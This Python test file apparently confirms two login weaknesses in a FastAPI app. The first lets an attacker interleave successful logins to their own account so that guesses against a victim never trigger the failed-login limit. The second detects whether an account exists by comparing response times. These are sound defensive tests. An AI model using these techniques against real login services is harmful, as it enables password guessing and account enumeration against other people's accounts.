"""ACC-P1: per-IP failed-login counter is reset by any successful login from that IP.

An attacker who owns one valid account can interleave 9 wrong guesses against a
victim with 1 successful login of their own and never hit the 429 limit.
"""
import time, uuid
from fastapi.testclient import TestClient
from app.main import app


def _register(client, email, pw):
    r = client.post("/api/v1/auth/register", json={"company_name": "验收企业", "owner_email": email,
        "owner_name": "验收用户", "owner_password": pw, "agreed_terms_version": "test-terms"})
    assert r.status_code == 201, r.text


def test_failed_login_limit_is_bypassed_by_interleaving_own_success():
    c = TestClient(app)
    victim, attacker = f"v-{uuid.uuid4().hex}@example.com", f"a-{uuid.uuid4().hex}@example.com"
    _register(c, victim, "victim-secret-password-1")
    _register(c, attacker, "attacker-password-123456")
    statuses = []
    for i in range(60):                       # 60 guesses against the victim (limit is 10 / 15 min)
        if i and i % 9 == 0:
            assert c.post("/api/v1/auth/login", data={"username": attacker, "password": "attacker-password-123456"}).status_code == 200
        statuses.append(c.post("/api/v1/auth/login", data={"username": victim, "password": f"guess-{i}"}).status_code)
    assert 429 not in statuses, "limiter held"            # passes => vulnerability confirmed
    assert statuses.count(401) == 60


def test_user_enumeration_timing():
    c = TestClient(app)
    email = f"t-{uuid.uuid4().hex}@example.com"
    _register(c, email, "timing-password-123456")
    def t(u):
        s = time.perf_counter(); c.post("/api/v1/auth/login", data={"username": u, "password": "wrong-password"}); return time.perf_counter() - s
    existing = sorted(t(email) for _ in range(4))[1]
    missing = sorted(t(f"nobody-{uuid.uuid4().hex}@example.com") for _ in range(4))[1]
    print(f"existing={existing*1000:.1f}ms missing={missing*1000:.1f}ms")
    assert existing > missing * 3          # passes => account existence leaks via timing
